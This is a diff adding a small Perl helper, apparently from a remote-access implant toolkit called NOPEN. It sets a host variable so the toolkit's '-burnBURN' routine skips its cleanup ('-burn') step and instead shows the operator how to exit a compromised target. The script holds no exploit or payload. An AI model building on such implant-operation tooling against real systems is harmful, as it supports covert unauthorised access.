@@ -1,0 +1,64 @@
+#!/usr/bin/env perl
+##
+# This should have almost no logic in it. Put it all in autoutils:nopendoNOTburn(),
+
+$VER="1.0.0.1";
+$| = 1 ;
+
+myinit() ;
+
+$prog = "autodoNOTburn";
+newhostvar("host_donotburn{$nopen_rhostname}","$prog");
+
+progprint($COLOR_NORMAL."\n".gmtime()."\n\n".
+      "Just set the following variable in your host variable file\n".
+      "     ($hostvarfile)\n".
+      "so that -burnBURN will NOT prompt you to -burn when the time comes and\n".
+      "will instead show you what to do to get off the box without -burn/BURN:\n\n".
+      "     \$host_donotburn{\"$nopen_rhostname\"} = \"$prog\";".
+      "\n\n");
+
+1;
+
+## END MAIN ##
+
+sub myinit {
+  $willautoport=1;
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+   }
+  require $autoutils;
+  $prog = "-gs doNOTburn";
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session with \"$prog\".
+
+";
+
+  $gsusagetext = "
+Usage: -gs doNOTburn
+
+-gs doNOTburn sets a local op-wide variable that all windows on this host ONLY
+will use that will cause -burnBURN to finish its checks and then NOT run -burn,
+but instead give you the right kill/-exit sequence to get off the target.
+
+Usage: -gs doNOTburn
+
+";
+  mydie("bad option(s)") if (! Getopts( "hv" ) ) ;
+  usage() if ($opt_h or $opt_v) ;
+
+#  $socket = pilotstart(quiet);
+
+} #myinit
+
